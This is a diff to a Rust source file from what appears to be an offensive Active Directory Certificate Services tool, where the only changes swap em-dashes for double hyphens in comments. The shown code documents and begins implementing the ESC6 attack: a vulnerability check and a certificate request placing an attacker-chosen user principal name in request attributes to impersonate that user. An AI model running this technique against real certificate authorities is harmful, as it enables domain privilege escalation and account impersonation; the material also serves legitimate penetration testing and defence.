@@ -1,8 +1,8 @@
-//! ESC6 — EDITF_ATTRIBUTESUBJECTALTNAME2 Abuse
+//! ESC6 -- EDITF_ATTRIBUTESUBJECTALTNAME2 Abuse
 //!
 //! When the CA has the `EDITF_ATTRIBUTESUBJECTALTNAME2` flag enabled,
 //! **any** certificate template can have a Subject Alternative Name (SAN)
-//! specified via request *attributes* — even if the template itself does
+//! specified via request *attributes* -- even if the template itself does
 //! not allow the enrollee to supply the subject.
 //!
 //! Attack flow:
@@ -11,7 +11,7 @@
 //! 3. Submit the CSR with the target UPN in the `san:` request attribute
 //! 4. If the CA honours it, the issued cert contains the attacker-chosen SAN
 //!
-//! Reference: SpecterOps "Certified Pre-Owned" — ESC6
+//! Reference: SpecterOps "Certified Pre-Owned" -- ESC6
 
 use crate::adcs::web_enrollment::WebEnrollmentClient;
 use crate::adcs::{IssuedCertificate, create_client_auth_csr};
@@ -49,7 +49,7 @@ impl Esc6Exploiter {
         self.web_client.check_esc6_vulnerable().await
     }
 
-    /// Execute ESC6 attack — submit a certificate request with the target UPN
+    /// Execute ESC6 attack -- submit a certificate request with the target UPN
     /// in the SAN request attribute.
     /// # Arguments
     /// * `template` - Any template with Client Authentication EKU
@@ -62,7 +62,7 @@ impl Esc6Exploiter {
             template, target_upn
         );
 
-        // Create a standard CSR (no SAN in the extension — we put it in attributes)
+        // Create a standard CSR (no SAN in the extension -- we put it in attributes)
         let (csr_der, private_key) = create_client_auth_csr("esc6-attack", template, None)?;
 
         // Submit with the SAN in request attributes (key differentiator of ESC6)
